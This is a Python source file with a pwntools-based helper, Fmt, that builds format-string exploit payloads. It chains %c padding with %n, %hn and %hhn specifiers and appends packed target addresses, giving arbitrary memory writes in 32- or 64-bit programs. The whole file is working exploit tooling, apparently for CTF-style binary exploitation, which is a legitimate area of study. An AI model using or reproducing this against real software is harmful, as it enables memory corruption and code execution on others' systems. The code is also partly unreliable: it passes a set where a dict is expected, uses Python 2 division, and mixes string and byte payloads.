import math
from pwn import *

def Fmt(offset, address,value,flag=1,per_byte='byte',padding_char='\x00',bits=64,full_write=1):
    """Fmt(offset, address,value,flag=1,per_byte='byte',padding_char='\x00',bits=64,full_write=1) --> str
    Arguments:
        offset: fmt string's offset
        address: 
        value: 
        flag: 
            1: return fmtstr+address
            0: return address+fmtstr, but sometimes it will crash
        per_byte: ``byte``, ``short`` or ``int``
        padding_char: char for padding in the mid
        bits: the architecture, only support 64 or 32
        full_write: write the full target align to int32(int64) or not
    PS:
        set context.arch is better
    """
    s2i=lambda x: int(math.log(x,2))
    if bits==64:
        arch_num=8
    else:
        arch_num=4
    payload=''
    if flag:
        # return fmtstr+address
        if per_byte=='byte':
            # just hard coding
            pbyte=1
            real_length=0x60*arch_num/8

        elif per_byte=='short':
            pbyte=2
            real_length=0x38*arch_num/8 # 0x30

        elif per_byte=='int':
            pbyte=4
            real_length=0x30*arch_num/8 # 0x22

        idx_off=real_length/arch_num
        tmp=value
        value_grp=[0,]
        while tmp!=0:
            value_grp.append(tmp&(0x100**pbyte-1))
            tmp/=0x100**pbyte

        if full_write:
            while len(value_grp)!=arch_num/pbyte+1:
                value_grp.append(0)
        
        for i in range(len(value_grp)):
            if i==0:
                continue
            payload+="%"+str((value_grp[i]+0x100**pbyte-value_grp[i-1]))+"c"
            payload+="%"+str(offset+i+idx_off-1)+"$"+'h'*(2-s2i(pbyte))+"n"

        payload=payload.ljust(real_length,padding_char)
        for i in range(len(value_grp)-1):
            if bits==64:
                payload+=p64(address+i*pbyte)    
            elif bits==32:
                payload+=p32(address+i*pbyte)    
    else:
        # return address+fmtstr, and sometimes it will crash
        return fmtstr_payload(offset,{address,value},write_size=per_byte)
    return payload